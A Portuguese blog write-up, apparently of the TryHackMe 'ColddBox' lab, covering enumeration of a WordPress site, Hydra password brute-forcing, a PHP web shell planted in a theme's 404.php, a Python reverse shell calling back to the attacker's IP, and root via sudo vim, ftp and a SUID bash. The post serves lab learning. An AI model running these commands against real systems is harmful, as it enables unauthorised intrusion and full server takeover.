---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - ColddBox - Fácil
date: 2024-01-08 02:26:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, sudo, wordpress, facil]     # TAG names should always be lowercase
show_image_post: true
---

![logo](/assets/img/ColddBox3.png){: w="100" h="100" .left}

___

# TryhackMe - ColddBox Fácil
---
---
## Enumeração

Ao acessar o site chequei com a extensão wappalyser

![Alt text](/assets/img/ColddBox1.png)

Wordpress encontrando rodei o 

### nmap

```text
──(kali💀kali)-[~]
└─$ sudo nmap 10.10.161.138 -Pn -sV        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-07 20:52 EST
Nmap scan report for 10.10.161.138
Host is up (0.22s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.00 seconds
```
{: .nolineno }
 
### gobuster


```text
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/hidden               (Status: 200) [Size: 340]
/server-status        (Status: 403) [Size: 278]
/wp-content           (Status: 200) [Size: 0]
/wp-includes          (Status: 200) [Size: 26809]
Progress: 20469 / 20470 (100.00%)
/wp-admin             (Status: 200) [Size: 2567]
===============================================================
Finished
===============================================================
```
{: .nolineno }

de interessante apenas /hidden e a pagina de login do wordpress /wp-admin

conteúdo da /hidden

```htm
U-R-G-E-N-T

C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```
{: .nolineno }

### wpscan
 
 Me retornou alguns usuários validos
 
```text
 [+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
{: .nolineno }
## Acesso

### hydra

Adicionei os 3 em users.txt

* c0ldd
* philip
* hugo


Tentei usar o patator por achar mais rápido, mas nao ficou estável,  por má configuração ou sei la...
Optei então pelo hydra

```shell
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.10.161.138 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 60 -F 
```
{: .nolineno }

Rapidamente me retornou login e senha

```text
[80][http-post-form] host: 10.10.161.138   login: c0ldd   password: 9876543210
```
{: .nolineno }

### Reverse Shell

Pesquisei por métodos de reverse shell encontrei esses
[aqui](https://gab3.medium.com/t%C3%A9cnicas-para-conseguir-reverse-shell-em-ambientes-wordpress-ede0b289a644)

Tentei o método do plugin as vezes retornava um erro, não sei se por conta do lag com servidor.
Optei pelo método de injetar a reverse shell  na 404.php

**Apenas adicionei o código na 404.php**

```php
echo shell_exec($_GET["cmd"]);
```
{: .nolineno }
![Alt text](/assets/img/ColddBox2.png)

Ao executar a pagina 404.php no navegador temos uma webshell que podemos executar comandos.

```text
Exemplo
/404.php?cmd=ls
```
{: .nolineno }

Tentei usar socat com wget e foi sem exito então , optei pelo python

```text
http://10.10.161.138/wp-content/themes/twentythirteen/404.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.6.125.125%22,4443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
{: .nolineno }

**Upgrade para shell interativa**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")';
ctrl+z
stty raw -echo;fg
export TERM=xterm-256color
```
{: .nolineno }

## Escalação de privilégio

Por pesquisa descobri que  wp-config.php contem login:senha do mysql

```text
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');
```
{: .nolineno }
Nada de útil encontrando no DB

/etc/passwd sem permissões de escrita

Tentei logar com as credencias do db na maquina e OK

```bash
su - c0ldd 
c0ldd@ColddBox-Easy:~$ 

Primeira flag obtida
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```
{: .nolineno }
Com sudo -l, é possível ver três formas de obter root, optei pelo vim.


```shell
c0ldd@ColddBox-Easy:~$ sudo -l
[sudo] password for c0ldd: 
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:~$ sudo -u root vim -c ':!/bin/bash'
root@ColddBox-Easy:/# 
```
{: .nolineno }
com cat em /root.txt obtivemos a ultima flag

wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

**Obter root com ftp**

sudo -u root ftp
ftp> !/bin/bash

**Obter root com chmod**

sudo -u root chmod 4775 /bin/bash

O 4 no início representa a permissão SUID (Set User ID). Quando definido em um arquivo executável, permite que um usuário que execute o arquivo temporariamente assuma as permissões do proprietário do arquivo. No caso do /bin/bash, isso permitiria que o usuário que o execute temporariamente tenha privilégios de root durante a execução.

bash -p

O argumento p preserva o bit SUID do  arquivo